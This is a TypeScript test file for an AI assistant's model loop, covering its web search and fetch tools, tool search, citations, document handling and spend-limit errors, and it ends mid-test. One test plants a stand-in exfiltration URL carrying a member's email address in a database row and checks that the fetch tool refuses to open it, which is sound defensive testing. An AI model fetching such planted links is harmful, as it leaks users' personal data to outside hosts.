import Anthropic from "@anthropic-ai/sdk"
import type {
  BetaContentBlock,
  BetaContentBlockParam,
  BetaMessageParam,
  BetaMessageStreamParams,
  BetaToolResultBlockParam,
} from "@anthropic-ai/sdk/resources/beta/messages/messages"
import { beforeEach, describe, expect, it, vi } from "vitest"
import { z } from "zod"
import type { JackToolPart, JackWebSourcesDisplay } from "@/lib/jack/parts"
import { fakeCitedText, fakeClaude, fakeEncrypted, fakeFileId, fakeToolSearch, fakeWebFetch, fakeWebSearch, searchDeferredTools, type FakeTurn } from "./fake-claude"
import { toolNote } from "./history"
import { apiErrorMessage, echoContent, MAX_TOOL_RESULT_DOCUMENTS, requestTools, resultContent, runModelReply, type ModelReplyOptions } from "./model-loop"
import { JACK_MODELS } from "./models"
import { buildSystemPrompt } from "./prompt"
import type { AnyJackTool, JackTool, JackToolContext } from "./tools/types"
import { TOOL_SEARCH_TOOL, WEB_LIMITS } from "./web-tools"

/*
 * The model loop's Jack 2.0 parts (#188, design §7.4): web search and fetch, citations, tool search,
 * document blocks and the spend-limit errors, against the scripted fake Claude
 */

const history: BetaMessageParam[] = [{ role: "user", content: "[Tue, Oct 13, 2026, 3:05 PM CT]\nGray: Who sponsors other college sim racing clubs?" }]

function countTool(run?: JackTool<{ table: string }>["run"]): JackTool<{ table: string }> {
  return {
    name: "count_rows",
    description: "Counts the rows in a table.",
    input: z.object({ table: z.string() }),
    run: vi.fn(run ?? (async ({ table }) => ({ forModel: JSON.stringify({ table, count: 42 }), label: `Counted ${table} (42)` }))),
  }
}

const webLinks = (): AnyJackTool => ({
  name: "web_links",
  description: "Web links from earlier replies in this room.",
  input: z.object({}),
  deferred: true,
  web: true,
  run: vi.fn(async () => ({ forModel: "[]", label: "Found 0 earlier web links" })),
})

let parts: JackToolPart[]
let streamed: string[]

function setup(script: FakeTurn[] | ((params: BetaMessageStreamParams, call: number) => FakeTurn), tools: AnyJackTool[] = [countTool()], extra: Partial<ModelReplyOptions> = {}) {
  const fake = fakeClaude(script)
  const options: ModelReplyOptions = {
    client: fake.client,
    config: JACK_MODELS.jack,
    system: buildSystemPrompt("jack"),
    tools,
    history,
    ctx: { roomId: "room-1", actor: { userId: "officer-gray", displayName: "Gray" } },
    onText: (text) => streamed.push(text),
    onPart: async (part) => {
      parts.push(part)
    },
    requestType: "room",
    ...extra,
  }
  return { fake, options, run: () => runModelReply(options) }
}

/** An officer turn that names these links, so web_fetch may open them (the fake checks, as the API does) */
function asking(...urls: string[]): Partial<ModelReplyOptions> {
  return { history: [{ role: "user", content: `[Tue, Oct 13, 2026, 3:05 PM CT]\nGray: What do ${urls.join(" and ")} say?` }] }
}

const toolResults = (message: BetaMessageParam) =>
  (message.content as { type: string }[]).filter((block): block is BetaToolResultBlockParam => block.type === "tool_result")
const nameOf = (tool: unknown) => (tool as { name?: string }).name
const toolNames = (params: BetaMessageStreamParams) => (params.tools ?? []).map(nameOf)
const sourcesOf = (part: JackToolPart | undefined) => (part?.displays.find((d) => d.kind === "web_sources") as JackWebSourcesDisplay | undefined) ?? null

const IRACING = { url: "https://www.iracing.com/college", title: "iRacing college program" }
const FIA = { url: "https://fia.com/esports", title: "FIA esports" }
const BLOG = { url: "https://blog.example.org/clubs", title: "Club roundup" }

beforeEach(() => {
  parts = []
  streamed = []
  vi.spyOn(console, "error").mockImplementation(() => {})
  vi.spyOn(console, "warn").mockImplementation(() => {})
  vi.spyOn(console, "info").mockImplementation(() => {})
})

describe("which tools a request sends", () => {
  it("sends no web tools unless JACK_WEB_TOOLS is on, and leaves out web-only tools with them", async () => {
    const { run, fake } = setup([{ text: "Done." }], [countTool(), webLinks()])
    await run()
    expect(toolNames(fake.calls[0])).toEqual(["count_rows"])
  })

  it("adds web search and fetch for a room reply when JACK_WEB_TOOLS=on, after Jack's tools and tool search", async () => {
    vi.stubEnv("JACK_WEB_TOOLS", "on")
    const { run, fake } = setup([{ text: "Done." }], [countTool(), webLinks()])
    await run()

    const tools = fake.calls[0].tools as unknown as Record<string, unknown>[]
    expect(tools.map(nameOf)).toEqual(["count_rows", "web_links", "tool_search_tool_bm25", "web_search", "web_fetch"])
    expect(tools[2]).toEqual(TOOL_SEARCH_TOOL)
    expect(tools[3]).toEqual({
      type: "web_search_20260209",
      name: "web_search",
      max_uses: WEB_LIMITS.searchMaxUses,
      user_location: { type: "approximate", city: "Austin", region: "Texas", country: "US", timezone: "America/Chicago" },
    })
    expect(tools[4]).toEqual({
      type: "web_fetch_20260209",
      name: "web_fetch",
      max_uses: WEB_LIMITS.fetchMaxUses,
      max_content_tokens: WEB_LIMITS.fetchMaxContentTokens,
      // Officers' messages and earlier search and fetch results only: no client tool's results but web_links'
      url_sources: {
        user_input: { type: "all" },
        server_tool_results: { type: "all" },
        client_tool_results: { type: "only", tools: [{ type: "tool_reference", name: "web_links" }] },
      },
    })
    // No citations on fetched pages: a request's documents have them all or none
    expect(tools[4]).not.toHaveProperty("citations")
  })

  it("lets web_fetch follow no client tool's results when web_links isn't offered", () => {
    const { defs } = requestTools([countTool()], { web: true })
    expect(defs.at(-1)).toMatchObject({ name: "web_fetch", url_sources: { client_tool_results: { type: "none" } } })
  })

  it("never gives a scheduled run the web tools, and tells its tools what kind of run it is", async () => {
    vi.stubEnv("JACK_WEB_TOOLS", "on")
    let seen: JackToolContext | null = null
    const tool = countTool(async (_input, ctx) => {
      seen = ctx
      return { forModel: "ok", label: "ok" }
    })
    const { run, fake } = setup([{ tools: [{ name: "count_rows", input: { table: "x" } }] }, { text: "Done." }], [tool, webLinks()], { requestType: "scheduled" })

    await run()

    expect(fake.calls.map(toolNames)).toEqual([["count_rows"], ["count_rows"]])
    expect(seen).toMatchObject({ requestType: "scheduled" })
  })

  it("tells a room reply's tools it's a room reply", async () => {
    let seen: JackToolContext | null = null
    const tool = countTool(async (_input, ctx) => {
      seen = ctx
      return { forModel: "ok", label: "ok" }
    })
    const { run } = setup([{ tools: [{ name: "count_rows", input: { table: "x" } }] }, { text: "Done." }], [tool])
    await run()
    expect(seen).toMatchObject({ requestType: "room" })
  })

  it("keeps the same definitions, in the same order, for the same tools and flag (they start the cached prefix)", () => {
    const tools = [countTool(), webLinks()]
    expect(requestTools(tools, { web: true })).toBe(requestTools(tools, { web: true }))
    expect(JSON.stringify(requestTools(tools, { web: true }).defs)).toBe(JSON.stringify(requestTools([countTool(), webLinks()], { web: true }).defs))
    // Without web tools and nothing else deferred, the request is today's: no tool search
    expect(requestTools(tools, { web: false }).defs.map(nameOf)).toEqual(["count_rows"])
  })

  it("refuses a Jack tool named like a server tool", () => {
    expect(() => requestTools([{ ...countTool(), name: "web_search" }], { web: false })).toThrow(/server tools/)
  })
})

describe("tool search", () => {
  const stripeTool = (): AnyJackTool => ({
    name: "stripe_overview",
    description: "Stripe balance, payouts, refunds and disputes.",
    input: z.object({ days: z.number().int().optional() }),
    deferred: true,
    run: vi.fn(async () => ({ forModel: JSON.stringify({ balance: 120 }), label: "Read the Stripe balance" })),
  })

  it("sends deferred tools with defer_loading (eager input streaming kept) and adds the BM25 search tool after them", () => {
    const { defs } = requestTools([countTool(), stripeTool()], { web: false })
    expect(defs.map(nameOf)).toEqual(["count_rows", "stripe_overview", "tool_search_tool_bm25"])
    expect(defs[0]).not.toHaveProperty("defer_loading")
    expect(defs[1]).toMatchObject({ name: "stripe_overview", defer_loading: true, eager_input_streaming: true })
    expect(defs[2]).toEqual({ type: "tool_search_tool_bm25_20251119", name: "tool_search_tool_bm25" })
    // The search tool is never deferred, and nothing carries cache_control (the breakpoint is on the system prompt)
    expect(JSON.stringify(defs)).not.toContain("cache_control")
  })

  it("runs a tool the model found through search, sends the search back unchanged, and shows no part for the search", async () => {
    const stripe = stripeTool()
    const { run, fake } = setup(
      (params, call) =>
        call === 0
          ? { blocks: fakeToolSearch("stripe payouts", searchDeferredTools(params, "stripe payouts")), tools: [{ id: "toolu_s", name: "stripe_overview", input: { days: 30 } }] }
          : { text: "The balance is $120 (stripe_overview)." },
      [countTool(), stripe]
    )

    const result = await run()

    expect(result).toMatchObject({ status: "done", outcome: "answered", toolCalls: 1 })
    expect(stripe.run).toHaveBeenCalledWith({ days: 30 }, expect.anything())
    const echoed = fake.calls[1].messages.at(-2)!.content as BetaContentBlockParam[]
    expect(echoed.map((block) => block.type)).toEqual(["thinking", "server_tool_use", "tool_search_tool_result", "tool_use"])
    expect(echoed[2]).toMatchObject({ content: { tool_references: [{ type: "tool_reference", tool_name: "stripe_overview" }] } })
    expect(result.parts.map((part) => part.name)).toEqual(["stripe_overview"])
    expect(fake.calls[1].tools).toEqual(fake.calls[0].tools)
  })
})

describe("web search and fetch", () => {
  beforeEach(() => {
    vi.stubEnv("JACK_WEB_TOOLS", "on")
  })

  it("shows a search as a part with what it looked for and the pages the answer cites", async () => {
    const { run, fake } = setup([
      {
        blocks: [
          ...fakeWebSearch("college sim racing sponsors", [IRACING, FIA, BLOG], { id: "srvtoolu_s1" }),
          fakeCitedText("iRacing runs a college program", [IRACING]),
          { type: "text", text: " and the FIA backs esports events", citations: null } as BetaContentBlock,
          fakeCitedText(" through its esports arm.", [FIA]),
        ],
      },
    ])

    const result = await run()

    // Cited stretches are separate blocks of one passage: joined as written, no paragraph breaks
    expect(result.text).toBe("iRacing runs a college program and the FIA backs esports events through its esports arm.")
    expect(result).toMatchObject({ status: "done", outcome: "answered", toolCalls: 0 })
    const [part] = result.parts
    expect(part).toMatchObject({ id: "srvtoolu_s1", name: "web_search", status: "done", label: "Searched the web (3 results, 2 cited)", input: { query: "college sim racing sponsors" }, at: 0 })
    expect(sourcesOf(part)).toEqual({
      kind: "web_sources",
      queries: ["college sim racing sponsors"],
      sources: [
        { title: "iRacing college program", url: IRACING.url, host: "iracing.com" },
        { title: "FIA esports", url: FIA.url, host: "fia.com" },
      ],
    })
    // Running as soon as the call starts, the query once its input has streamed, done with the result,
    // then each cited page as the text citing it streams
    expect(parts.filter((p) => p.id === "srvtoolu_s1").map((p) => [p.status, p.label, sourcesOf(p)?.queries.length ?? 0])).toEqual([
      ["running", "Searching the web", 0],
      ["running", "Searching the web", 1],
      ["done", "Searched the web (3 results)", 1],
      ["done", "Searched the web (3 results, 1 cited)", 1],
      ["done", "Searched the web (3 results, 2 cited)", 1],
    ])
    expect(fake.calls).toHaveLength(1)
    // A search costs $0.01 on top of its tokens
    expect(result.usage.webSearches).toBe(1)
    expect(result.usage.costUsd).toBeCloseTo((100 * 2 + 20 * 10) / 1e6 + 0.01, 6)
  })

  it("lists the results an answer links to when it has no citations (dynamic filtering writes its own links)", async () => {
    const { run } = setup([
      {
        blocks: [
          ...fakeWebSearch("college sim racing sponsors", [IRACING, FIA, BLOG], { id: "srvtoolu_s1" }),
          { type: "text", text: `iRacing runs a [college program](${IRACING.url}).`, citations: null } as BetaContentBlock,
        ],
      },
    ])

    const result = await run()

    const [part] = result.parts
    expect(part).toMatchObject({ id: "srvtoolu_s1", label: "Searched the web (3 results, 1 cited)" })
    expect(sourcesOf(part)?.sources).toEqual([{ title: "iRacing college program", url: IRACING.url, host: "iracing.com" }])
  })

  it("records searches in the history's tool note, with the sites the answer cited", async () => {
    const { run } = setup([{ blocks: [...fakeWebSearch("college sim racing sponsors", [IRACING, BLOG]), fakeCitedText("iRacing runs one.", [IRACING])] }])
    const result = await run()
    expect(toolNote(result.parts)).toBe('[Tools used: web_search {"query":"college sim racing sponsors"} → Searched the web (2 results, 1 cited) (cited: iracing.com)]')
  })

  it("shows a page it read, and a page it couldn't open with the reason", async () => {
    const { run } = setup(
      [
        {
          blocks: [
            ...fakeWebFetch("https://www.iracing.com/college", { title: "College program" }, { id: "srvtoolu_f1" }),
            ...fakeWebFetch("https://example.com/private", { error: "url_not_accessible" }, { id: "srvtoolu_f2" }),
            { type: "text", text: "The program page says it's free for clubs.", citations: null } as BetaContentBlock,
          ],
        },
      ],
      [countTool()],
      asking("https://www.iracing.com/college", "https://example.com/private")
    )

    const result = await run()

    expect(result.parts[0]).toMatchObject({ name: "web_fetch", status: "done", label: "Read iracing.com", input: { url: "https://www.iracing.com/college" } })
    expect(sourcesOf(result.parts[0])?.sources).toEqual([{ title: "College program", url: "https://www.iracing.com/college", host: "iracing.com" }])
    expect(result.parts[1]).toMatchObject({ name: "web_fetch", status: "error", label: "Couldn't open example.com", error: "Couldn't open example.com: the page couldn't be reached" })
    expect(result.usage.webFetches).toBe(2)
    expect(result.usage.webSearches).toBe(0)
  })

  it.each<[string, AnyJackTool[]]>([
    ["with web_links offered", [webLinks()]],
    ["without web_links", []],
  ])("can't open a link that's only in a client tool's result (a run_sql row) %s", async (_with, extra) => {
    const leak = "https://leak.example/collect?email=member@utexas.edu"
    const sql: JackTool<Record<string, never>> = {
      name: "run_sql",
      description: "Runs a read-only query.",
      input: z.object({}),
      run: async () => ({ forModel: JSON.stringify({ rows: [{ portfolio: leak }] }), label: "Ran a query (1 row)" }),
    }
    const { run, fake } = setup(
      [{ tools: [{ name: "run_sql", input: {} }] }, { blocks: fakeWebFetch(leak, { title: "Collected" }, { id: "srvtoolu_leak" }), text: "Opened it." }],
      [sql, ...extra]
    )

    const result = await run()

    expect(JSON.stringify(fake.calls[1].messages)).toContain(leak)
    expect(result.parts.find((p) => p.id === "srvtoolu_leak")).toMatchObject({
      status: "error",
      label: "Couldn't open leak.example",
      error: "Couldn't open leak.example: only links an officer posted or a web search found can be opened",
    })
  })

  it("can open a link web_links returned, and one a search found earlier in the same response", async () => {
    const links: AnyJackTool = { ...webLinks(), run: vi.fn(async () => ({ forModel: JSON.stringify({ replies: [{ links: [{ n: 1, title: FIA.title, url: FIA.url }] }] }), label: "Found 1 earlier web link" })) }
    const { run } = setup(
      [
        { tools: [{ name: "web_links", input: {} }] },
        { blocks: [...fakeWebFetch(FIA.url, {}, { id: "srvtoolu_linked" }), ...fakeWebSearch("blogs", [BLOG]), ...fakeWebFetch(BLOG.url, {}, { id: "srvtoolu_found" })], text: "Both opened." },
      ],
      [countTool(), links]
    )

    const result = await run()

    expect(result.parts.filter((p) => p.name === "web_fetch").map((p) => [p.id, p.status])).toEqual([
      ["srvtoolu_linked", "done"],
      ["srvtoolu_found", "done"],
    ])
  })

  it("gets max_uses_exceeded from the fake for a call past the request's max_uses", async () => {
    const searches = Array.from({ length: WEB_LIMITS.searchMaxUses + 1 }, (_, i) => fakeWebSearch(`q${i}`, [IRACING])).flat()
    const { run } = setup([{ blocks: searches, text: "Done." }])

    const result = await run()

    expect(result.parts.map((p) => p.status)).toEqual([...Array(WEB_LIMITS.searchMaxUses).fill("done"), "error"])
    expect(result.parts.at(-1)).toMatchObject({ error: "Web search failed: this answer has used up its searches and pages" })
    expect(result.usage.webSearches).toBe(WEB_LIMITS.searchMaxUses)
  })

  it("shows a failed search as an error part, and doesn't bill it", async () => {
    const { run } = setup([{ blocks: fakeWebSearch("sponsors", { error: "too_many_requests" }), text: "Search is busy; try again shortly." }])
    const result = await run()
    expect(result.parts[0]).toMatchObject({ status: "error", label: "Web search failed", error: "Web search failed: too many requests right now; try again in a minute" })
    expect(sourcesOf(result.parts[0])?.queries).toEqual(["sponsors"])
    expect(result.usage.webSearches).toBe(0)
  })

  it("separates text after a search from the text before it", async () => {
    const { run } = setup([{ blocks: [{ type: "text", text: "Let me check.", citations: null } as BetaContentBlock, ...fakeWebSearch("x", [IRACING]), { type: "text", text: "Found it.", citations: null } as BetaContentBlock] }])
    const result = await run()
    expect(result.text).toBe("Let me check.\n\nFound it.")
    expect(result.parts[0].at).toBe("Let me check.".length)
  })

  it("passes blocks it doesn't know back verbatim (dynamic filtering's code execution), and keeps the container", async () => {
    const caller = { type: "code_execution_20260120" as const, tool_id: "srvtoolu_code" }
    const code = [
      { type: "server_tool_use", id: "srvtoolu_code", name: "code_execution", input: { code: "filter(results)" } },
      ...fakeWebSearch("lsr sponsors", [IRACING], { id: "srvtoolu_nested", caller }),
      { type: "code_execution_tool_result", tool_use_id: "srvtoolu_code", content: { type: "encrypted_code_execution_result", encrypted_stdout: "opaque", stderr: "", return_code: 0, content: [] } },
    ] as unknown as BetaContentBlock[]
    const { run, fake } = setup([
      { blocks: code, tools: [{ id: "toolu_c", name: "count_rows", input: { table: "User" } }], container: "container_1" },
      { text: "Done." },
    ])

    const result = await run()

    const echoed = fake.calls[1].messages.at(-2)!.content as BetaContentBlockParam[]
    expect(echoed.slice(1, 5)).toEqual(code)
    expect(fake.calls[0]).not.toHaveProperty("container")
    expect(fake.calls[1].container).toBe("container_1")
    // The nested search is a part like any other; code execution itself isn't
    expect(result.parts.map((part) => part.name)).toEqual(["web_search", "count_rows"])
    expect(result.parts[0]).toMatchObject({ status: "done" })
  })

  it("lets a web call still running in a mixed turn finish in the next call, sending only tool results meanwhile", async () => {
    const [fetchCall, fetchResult] = fakeWebFetch("https://fia.com/esports", { title: "FIA esports" }, { id: "srvtoolu_pending" })
    const { run, fake } = setup(
      [
        { blocks: [fetchCall], tools: [{ id: "toolu_a", name: "count_rows", input: { table: "User" } }] },
        { blocks: [fetchResult], text: "The FIA page and 42 members." },
      ],
      [countTool()],
      // The tool cap is reached by the first round, which would add a wrap-up note
      { ...asking("https://fia.com/esports"), limits: { maxToolCalls: 1 } }
    )

    const result = await run()

    expect(result).toMatchObject({ status: "done", outcome: "answered" })
    // Tool results only: text after them would be rejected while the fetch is running
    const followUp = fake.calls[1].messages.at(-1)!.content as BetaContentBlockParam[]
    expect(followUp.map((block) => block.type)).toEqual(["tool_result"])
    expect(fake.calls[1].tool_choice).toBeUndefined()
    // Running across the calls, then read
    const fetchParts = parts.filter((p) => p.id === "srvtoolu_pending")
    expect(fetchParts.some((p) => p.status === "error")).toBe(false)
    expect(result.parts.find((p) => p.id === "srvtoolu_pending")).toMatchObject({ status: "done", label: "Read fia.com" })
  })

  it("adds the wrap-up note once a pending web call has finished", async () => {
    const [fetchCall, fetchResult] = fakeWebFetch("https://fia.com/esports", {}, { id: "srvtoolu_p" })
    const { run, fake } = setup(
      [
        { blocks: [fetchCall], tools: [{ id: "toolu_a", name: "count_rows", input: { table: "A" } }] },
        { blocks: [fetchResult], tools: [{ id: "toolu_b", name: "count_rows", input: { table: "B" } }] },
        { text: "Here's what I have." },
      ],
      [countTool()],
      { ...asking("https://fia.com/esports"), limits: { maxToolCalls: 1 } }
    )

    const result = await run()

    expect(result.parts.find((p) => p.id === "srvtoolu_p")).toMatchObject({ status: "done", label: "Read fia.com" })
    expect(result.toolCalls).toBe(1)
    expect(result.parts.find((p) => p.id === "toolu_b")).toMatchObject({ status: "error", label: "Skipped: tool limit reached" })
    const second = fake.calls[2].messages.at(-1)!.content as { type: string; text?: string }[]
    expect(second.at(-1)).toMatchObject({ type: "text", text: expect.stringContaining("Don't call any more tools") })
    expect(fake.calls[2].tool_choice).toEqual({ type: "none" })
  })

  it("tells the reply to wrap up once it has used its web searches", async () => {
    const { run, fake } = setup(
      [
        { blocks: [...fakeWebSearch("a", [IRACING]), ...fakeWebSearch("b", [FIA])], tools: [{ name: "count_rows", input: { table: "x" } }] },
        { text: "Here's what I found." },
      ],
      [countTool()],
      { limits: { maxWebSearches: 2 } }
    )

    const result = await run()

    expect(result).toMatchObject({ outcome: "answered", wrappedUp: true })
    expect(fake.calls[1].tool_choice).toEqual({ type: "none" })
    const last = fake.calls[1].messages.at(-1)!.content as { type: string; text?: string }[]
    expect(last.at(-1)?.text).toMatch(/^You've used this reply's 2 web searches\. Don't call any more tools/)
  })

  it("carries on after a pause, sending the paused turn back unchanged", async () => {
    const { run, fake } = setup([{ blocks: fakeWebSearch("a", [IRACING]), stop: "pause_turn" }, { blocks: [fakeCitedText("Found it.", [IRACING])] }])

    const result = await run()

    expect(result).toMatchObject({ outcome: "answered", text: "Found it." })
    expect(fake.calls[1].messages.at(-1)).toMatchObject({ role: "assistant" })
    expect((fake.calls[1].messages.at(-1)!.content as BetaContentBlockParam[]).map((b) => b.type)).toEqual(["thinking", "server_tool_use", "web_search_tool_result"])
    expect(fake.calls[1].tool_choice).toBeUndefined()
    expect(sourcesOf(result.parts[0])?.sources.map((s) => s.url)).toEqual([IRACING.url])
  })

  it("wraps up at a pause once the searches are used up", async () => {
    const { run, fake } = setup([{ blocks: fakeWebSearch("a", [IRACING]), stop: "pause_turn" }, { text: "What I have so far." }], [countTool()], { limits: { maxWebSearches: 1 } })

    const result = await run()

    expect(result).toMatchObject({ outcome: "answered", wrappedUp: true })
    expect(fake.calls[1].tool_choice).toEqual({ type: "none" })
    expect(fake.calls[1].messages.at(-1)).toMatchObject({ role: "user", content: [{ type: "text", text: expect.stringMatching(/^You've used this reply's 1 web searches/) }] })
  })

  it("stops at a pause with a search still pending once the searches are used up", async () => {
    const [pending] = fakeWebSearch("c", [BLOG], { id: "srvtoolu_dangling" })
    const { run, fake } = setup([{ blocks: [...fakeWebSearch("a", [IRACING]), pending], stop: "pause_turn" }], [countTool()], { limits: { maxWebSearches: 1 } })

    const result = await run()

    expect(fake.calls).toHaveLength(1)
    expect(result).toMatchObject({ outcome: "tool_limit", status: "done" })
    expect(result.text).toMatch(/used up its web searches/)
    expect(result.parts.find((p) => p.id === "srvtoolu_dangling")).toMatchObject({ status: "error" })
  })

  it("wraps up at a pause once the reply has run long, not only when its web share is used up", async () => {
    const { run, fake } = setup([{ blocks: fakeWebSearch("a", [IRACING]), stop: "pause_turn" }, { text: "What I have so far." }], [countTool()], { limits: { maxElapsedMs: 0 } })

    const result = await run()

    expect(result).toMatchObject({ outcome: "answered", wrappedUp: true })
    expect(fake.calls[1].tool_choice).toEqual({ type: "none" })
    expect(fake.calls[1].messages.at(-1)).toMatchObject({ role: "user", content: [{ type: "text", text: expect.stringMatching(/^This reply is running long\. Don't call any more tools/) }] })
  })

  it("stops at a pause with a fetch pending once its pages are used up, and says that's what it ran out of", async () => {
    const [pending] = fakeWebFetch(BLOG.url, {}, { id: "srvtoolu_dangling" })
    const { run, fake } = setup([{ blocks: [...fakeWebFetch(FIA.url, {}), pending], stop: "pause_turn" }], [countTool()], { ...asking(FIA.url, BLOG.url), limits: { maxWebFetches: 1 } })

    const result = await run()

    expect(fake.calls).toHaveLength(1)
    expect(result).toMatchObject({ outcome: "tool_limit", status: "done" })
    expect(result.text).toBe("(Jack stopped here: this answer opened all the web pages it can. Ask a follow-up to keep going.)")
    expect(result.parts.find((p) => p.id === "srvtoolu_dangling")).toMatchObject({ status: "error", label: "Didn't run: the reply opened all the web pages it can" })
  })

  it("after a refusal fallback, drops the declined model's server calls together with their results, and its citations", async () => {
    const declined = [
      ...fakeWebSearch("declined search", [BLOG], { id: "srvtoolu_declined" }),
      fakeCitedText("The blog says", [BLOG]),
      { type: "fallback", from: { model: "claude-sonnet-5-5" }, to: { model: "claude-sonnet-5" }, trigger: { type: "refusal" } },
    ] as unknown as BetaContentBlock[]
    const { run, fake } = setup([
      { leading: declined, blocks: fakeWebSearch("after", [IRACING], { id: "srvtoolu_after" }), tools: [{ id: "toolu_after", name: "count_rows", input: { table: "User" } }], model: "claude-sonnet-5" },
      { text: "42.", model: "claude-sonnet-5" },
    ])

    const result = await run()

    // The fake rejects a result without its call, so getting here means the turn went back valid
    expect(result).toMatchObject({ status: "done", outcome: "answered" })
    const echoed = fake.calls[1].messages.at(-2)!.content as BetaContentBlockParam[]
    expect(echoed.map((block) => (block.type === "server_tool_use" ? `server_tool_use:${block.id}` : block.type))).toEqual([
      "text",
      "thinking",
      "server_tool_use:srvtoolu_after",
      "web_search_tool_result",
      "tool_use",
    ])
    expect(echoed[0]).toEqual({ type: "text", text: "The blog says" })
  })

  it("closes a search in a call that came through garbled, and keeps it closed when the call is asked again", async () => {
    const [started] = fakeWebSearch("half", [], { id: "srvtoolu_garbled" })
    const { run } = setup([
      { blocks: [started], tools: [{ name: "count_rows", input: { table: "x" } }], error: new Error("Unable to parse tool parameter JSON") },
      { blocks: fakeWebSearch("again", [IRACING]), text: "Found it." },
    ])

    const result = await run()

    expect(result.outcome).toBe("answered")
    const events = parts.filter((p) => p.id === "srvtoolu_garbled").map((p) => p.status)
    expect(events.at(-1)).toBe("error")
    expect(events.slice(events.indexOf("error"))).toEqual(["error"])
    expect(result.parts.filter((p) => p.name === "web_search").map((p) => p.status)).toEqual(["error", "done"])
  })

  it("counts the searches a call reported before it failed", async () => {
    const overloaded = new Anthropic.InternalServerError(529, { type: "error" }, "overloaded", new Headers())
    const usage = { input_tokens: 100, output_tokens: 0, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, server_tool_use: null }
    const events = [
      { type: "message_start", message: { model: "claude-sonnet-5-5", content: [], usage } },
      { type: "message_delta", delta: { stop_reason: null }, usage: { output_tokens: 30, server_tool_use: { web_search_requests: 2 } } },
    ]
    const { options } = setup([])
    const client = {
      ...options.client,
      stream: () => ({
        async *[Symbol.asyncIterator]() {
          yield* events as never[]
          throw overloaded
        },
        finalMessage: () => Promise.reject(overloaded),
      }),
    }

    const result = await runModelReply({ ...options, client })

    expect(result.outcome).toBe("api_error")
    expect(result.usage.webSearches).toBe(2)
    expect(result.usage.costUsd).toBeCloseTo((100 * 2 + 30 * 10) / 1e6 + 0.02, 6)
  })

  it("gets a 400 from the fake if a server call's result is answered with a tool_result (the loop never does)", async () => {
    const fake = fakeClaude([{ text: "unused" }])
    const stream = fake.client.stream({
      model: "claude-sonnet-5-5",
      max_tokens: 10,
      messages: [
        { role: "user", content: "hi" },
        { role: "assistant", content: fakeWebSearch("a", [IRACING], { id: "srvtoolu_x" }).slice(0, 1) as BetaContentBlockParam[] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: "srvtoolu_x", content: "no" }] },
      ],
    })
    await expect(stream.finalMessage()).rejects.toBeInstanceOf(Anthropic.BadRequestError)
  })
})

describe("echoContent", () => {
  it("is the response's blocks as they came when no fallback happened", () => {
    const blocks = [...fakeWebSearch("a", [IRACING]), fakeCitedText("x", [IRACING])]
    expect(echoContent(blocks)).toBe(blocks)
  })

  it("keeps search results with an unchanged encrypted_content", () => {
    const [, result] = fakeWebSearch("a", [IRACING])
    expect(JSON.stringify(echoContent([result]))).toContain(fakeEncrypted(IRACING.url))
  })
})

describe("documents in tool results", () => {
  it("sends a Files API document by id, and a base64 PDF, each after its caption and before any images", () => {
    const content = resultContent(
      "Two files.",
      [{ caption: "The flyer:", mediaType: "image/png", data: "IMG" }],
      [
        { caption: "The sponsor deck:", title: "Acme deck.pdf", source: { type: "file", fileId: "file_011abc" } },
        { caption: "The receipt:", source: { type: "base64", mediaType: "application/pdf", data: "JVBERi0=" } },
      ]
    )
    expect(content).toEqual([
      { type: "text", text: "Two files." },
      { type: "text", text: "The sponsor deck:" },
      { type: "document", source: { type: "file", file_id: "file_011abc" }, title: "Acme deck.pdf" },
      { type: "text", text: "The receipt:" },
      { type: "document", source: { type: "base64", media_type: "application/pdf", data: "JVBERi0=" } },
      { type: "text", text: "The flyer:" },
      { type: "image", source: { type: "base64", media_type: "image/png", data: "IMG" } },
    ])
  })

  it(`caps the documents at ${MAX_TOOL_RESULT_DOCUMENTS} and says how many were left out`, () => {
    const documents = Array.from({ length: MAX_TOOL_RESULT_DOCUMENTS + 1 }, (_, i) => ({ caption: `File ${i + 1}:`, source: { type: "file" as const, fileId: `file_${i}` } }))
    const content = resultContent("Files.", [], documents) as { type: string; text?: string }[]
    expect(content.filter((block) => block.type === "document")).toHaveLength(MAX_TOOL_RESULT_DOCUMENTS)
    expect(content.at(-1)).toEqual({ type: "text", text: "(1 more documents left out; ask for fewer at a time.)" })
  })

  it("puts a tool's documents in its tool_result, and keeps them out of the part", async () => {
    const pdf = fakeFileId("pdf")
    const tool = countTool(async () => ({ forModel: "Read the file.", label: "Read Acme deck.pdf", documents: [{ caption: "Acme deck.pdf:", source: { type: "file", fileId: pdf } }] }))
    const { run, fake } = setup([{ tools: [{ name: "count_rows", input: { table: "x" } }] }, { text: "The deck asks for $500." }], [tool])

    const result = await run()

    expect(result).toMatchObject({ status: "done", outcome: "answered" })
    expect(toolResults(fake.calls[1].messages.at(-1)!)[0].content).toEqual([
      { type: "text", text: "Read the file." },
      { type: "text", text: "Acme deck.pdf:" },
      { type: "document", source: { type: "file", file_id: pdf } },
    ])
    expect(JSON.stringify(result.parts)).not.toContain(pdf)
  })

  it("sends a tool's document alongside a fetched page in one request (neither has citations)", async () => {
    vi.stubEnv("JACK_WEB_TOOLS", "on")
    const tool = countTool(async () => ({ forModel: "Read the file.", label: "Read it", documents: [{ caption: "The PDF:", source: { type: "file", fileId: fakeFileId("pdf") } }] }))
    const { run } = setup(
      [{ blocks: fakeWebFetch("https://fia.com/esports", {}), tools: [{ name: "count_rows", input: { table: "x" } }] }, { text: "Both say the same." }],
      [tool],
      asking("https://fia.com/esports")
    )
    const result = await run()
    expect(result).toMatchObject({ status: "done", outcome: "answered" })
    expect(result.parts[0]).toMatchObject({ name: "web_fetch", status: "done" })
  })
})

describe("spend limits", () => {
  const badRequest = (message: string) => new Anthropic.BadRequestError(400, { type: "error", error: { type: "invalid_request_error", message } }, `400 ${message}`, new Headers())

  it.each([
    ["the org's limit", badRequest("You have reached your specified API usage limits. You will regain access on 2026-11-01 at 00:00 UTC.")],
    ["a workspace's limit", badRequest("You have reached your specified workspace API usage limits. You will regain access on 2026-11-01 at 00:00 UTC.")],
    [
      "the usage tier's cap",
      new Anthropic.RateLimitError(429, { type: "error", error: { type: "rate_limit_error", message: "Spend limit reached", details: { error_code: "enforced_spend_limit_reached" } } }, "429 Spend limit reached", new Headers()),
    ],
  ])("says the account hit its spend limit for %s, instead of a bug or a busy minute", async (_what, error) => {
    expect(apiErrorMessage(error, "Jack")).toMatch(/^Claude turned this request down: the Anthropic account has reached its spend limit\. Jack can't answer until an admin raises the limit/)
    const { run } = setup([{ text: "", error }])
